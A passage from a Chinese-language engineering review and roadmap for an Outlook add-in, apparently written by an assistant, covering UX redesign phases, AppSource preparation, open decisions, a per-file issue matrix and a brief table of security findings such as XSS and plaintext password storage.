- 客製 Bootstrap theme(或考慮整套換 Microsoft Fluent UI Web Components,與 Outlook 視覺一致)
- light + dark Office theme 完整適配(U-7)

#### 3.2 主流程 UX 重做
- 上傳進度條 + 百分比 + 速度 + 取消(U-3, R-11)
- Drag-and-drop 上傳(U-6)
- 全程 a11y:`aria-*`、focus management、`aria-live`、鍵盤導航(U-5)
- 視覺狀態區分(U-8)
- Server URL 即時驗證 + 私鑰檔案選擇回饋(U-9, U-10)
- 微互動 / view 切換動畫(U-14)
- 重新調整 logout/refresh 按鈕位置(U-15)
- 首次使用 onboarding(U-12)
- 7 天倒數顯示(U-13)

#### 3.3 品牌與支援
- 版本顯示 + Report Issue 入口(U-11)
- `privacy.html` / `support.html` 重寫

**驗收**:WCAG 2.1 AA pass(用 axe-core 自動掃 + 手動跑 NVDA)、light/dark theme 截圖比對、UX 走查(5 個非工程同事不看說明完成上傳流程)。

---

### Phase 4 — 上架準備 + 文件完整(1-2 週)

**目標**:可以送上 Microsoft AppSource 或企業 sideload。

- ARCHITECTURE.md(D-2)、CHANGELOG.md(D-3)、LICENSE(D-4)、SECURITY.md(D-5)、CONTRIBUTING.md(D-6)
- AppSource 上架素材:screenshots、demo video、長/短描述、隱私政策、支援連結
- Manifest 微調:`AppDomains` 策略決定(M-1)、`Permissions` 降權嘗試(M-2)、support URL 改企業域名(M-3)、icons 自家 host(M-4)
- 安全自我評估文件(Microsoft 365 App Compliance Program)
- Penetration test(可選,委外)

---

## 10. 需要你裁決的決策清單

寫進路線圖前有些方向性的選擇,建議優先確認:

| # | 決策 | 選項 | 影響 |
|---|---|---|---|
| Q1 | 後端是否能改? | (A) 完全不能 / (B) 可協調 / (C) 我們有控制權 | 決定 S-2/S-5/S-8/S-14/S-15 的命運 |
| Q2 | RoamingSettings 要不要保留? | (A) 拔掉,只用 IndexedDB / (B) 加密後保留 | 跨裝置同步行為 vs 安全 |
| Q3 | UI 是否真的脫離 Gmail 版? | (A) 完全自由設計 / (B) 兩版一起翻新 | 你已選 A,但要確認 Gmail 版會不會自己改 |
| Q4 | 上架 AppSource 還是企業內部 sideload? | (A) AppSource / (B) Sideload / (C) 都要 | 影響 Phase 4 工作量 |
| Q5 | 是否引入錯誤監控? | (A) Sentry / (B) 自家 endpoint / (C) 不用 | 影響合規(資料外送的隱私) |
| Q6 | TypeScript `strict` 等級? | (A) 全 strict / (B) 漸進開啟 | 影響 Phase 1 時程 |
| Q7 | 設計系統用什麼? | (A) Microsoft Fluent UI Web Components / (B) 自訂 Bootstrap theme / (C) Tailwind | 影響 Phase 3 視覺風格 |

---

## 11. 附錄

### 11.1 檔案清單與職責矩陣

| 檔案 | LOC | 職責 | 主要問題 |
|---|---|---|---|
| outlook/taskpane.html | 149 | 入口 HTML / view 結構 | 缺 successView、無 CSP、vh-100 bug |
| outlook/view-switcher.js | 364 | view 切換 + 收件人 + 主題 + 附件 + onReady | 過肥(R-3) |
| outlook/auth-handler.js | 189 | 4 個按鈕 binding | 不驗證後端、catch 吞錯 |
| outlook/storage-adapter.js | 326 | IndexedDB + RoamingSettings | RoamingSettings 同步、無 timeout |
| outlook/upload-handler.js | 105 | 上傳流程 | 無進度、無 cancel、可重複觸發 |
| outlook/link-inserter.js | 52 | 插入郵件本文 | **XSS** |
| outlook/error-handler.js | 107 | 錯誤顯示 + log | log 不持久化 |
| outlook/ribbon-handler.js | 50 | Ribbon 開 Taskpane | Taskpane URL 硬寫 |
| outlook/constants.js | 35 | Outlook 專屬常數 | OK |
| outlook/_attachment-handler.js | 12 | 空殼 | 應刪 |
| shared/storage-core.js | 49 | 過期判斷 + 認證邏輯 | 明文密碼 / Base64 私鑰 |
| shared/apiService.js | 99 | upload/download API | 無 schema 驗證 |
| shared/downloadService.js | 214 | 下載輪詢 | 無 timeout、destructure bug |
| shared/constants.js | ? | 訊息 + key 常數 | 需 review |
| shared/utils.js | 40 | sleep / API 錯誤 / Base64 | btoa 偽加密 |
| manifest.xml | 93 | Office Add-in 定義 | AppDomains 太窄、權限過寬 |
| eslint.config.js | 54 | ESLint 規則 | 已不錯,可微調 |
| package.json | 11 | 套件定義 | 缺 metadata + scripts |
| README.md | 1 | 文件 | 形同沒寫 |

### 11.2 主要安全/可靠性發現速查表

| ID | 類別 | 嚴重 | 範圍 | 一句話 |
|---|---|---|---|---|
| S-1 | XSS | Critical | Client | 檔名/baseUrl 未跳脫直接插入 HTML |
| S-2 | 密碼 | Critical | Client(+Server) | 明文存 7 天且跨裝置同步 |
| S-3 | 私鑰 | Critical | Client | Base64 ≠ 加密 |
| S-4 | URL | Critical | Client | 不驗 HTTPS / domain |
| S-5 | Auth | Critical | Client+Server | 不驗證直接存 |
| S-6 | CSP | High | Client | 沒 CSP |
| S-7 | SRI | High | Client | Icons CDN 無 SRI |
| S-8 | Session | High | Server | 過期只在 client |
| S-9 | 檔案 | High | Client+Server | 無 type 驗證 |
| S-10 | Rate | High | Server | 無 brute force 防護 |
| R-1 | UI | Critical | Client | successView 不存在 |
| R-2 | Dead | Critical | Client | 空殼檔混淆 |
| R-3 | 架構 | Critical | Client | view-switcher 過肥 |

---

## 12. 結語

這個專案的**核心邏輯與分層概念是對的**,PRD 寫得相當清楚,JSDoc 也認真,顯示原始作者有 clean code 意識。但專案沒走完一個完整的工程化流程,所以在**型別系統、測試、bundling、a11y、UI 質感、deeper security**等面向上明顯停留在 PoC 等級。

**好消息**:核心架構不需要重寫,大部分是「補強」而非「打掉重做」。按 4 個 Phase 推進,6-10 週(單一資深工程師)即可達到企業級可上架的水準。

**最大風險**:S-2 / S-5 / S-8 / S-14 都需要後端配合,如果後端完全不能動,客戶端能做的只是「降低風險」而非「消除風險」,enterprise 客戶在資安問卷上仍可能卡關。建議盡早與後端團隊對齊。

**建議下一步**:回應 §10 的 7 個決策問題,然後從 Phase 0 開始動手。我可以一個 Phase 一個 Phase 帶你做,每個 Phase 結束都會 commit + 跑驗收。
